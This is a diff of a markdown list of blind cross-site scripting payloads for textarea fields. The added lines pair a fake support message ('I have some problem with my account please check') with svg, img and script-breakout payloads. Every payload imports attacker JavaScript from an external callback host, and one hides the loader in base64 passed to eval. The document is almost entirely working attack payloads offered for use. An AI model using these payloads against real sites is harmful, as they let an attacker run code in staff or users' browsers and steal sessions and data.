@@ -20,12 +20,22 @@
 ```
 ### All textarea
 ```
+I have some problem with my account please check
+<svg/onload=import('//xss.report/c/hnterx?svg')>
+```
+```
+I have some problem with my account please check
+<img/src/onerror=import('//xss.report/c/hnterx?img');//>
+```
+```
+I have some problem with my account please check
 ';"/></textarea></script><script/src=//xss.report/c/hnterx?tr
 ```
 ```
 <img/src/onerror=import('//xss.report/c/hnterx?img');//>
 <svg/onload=import('//xss.report/c/hnterx?svg')>
 '";//></textarea></script><script/src=//xss.report/c/hnterx?60
+';"/></textarea></script><script/src=//xss.report/c/hnterx?tr
 ';"/></textarea></script><script src="https://xss.report/c/hnterx?46"></script>
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\hnterx/.source))//>
 '"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8yMiI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))//
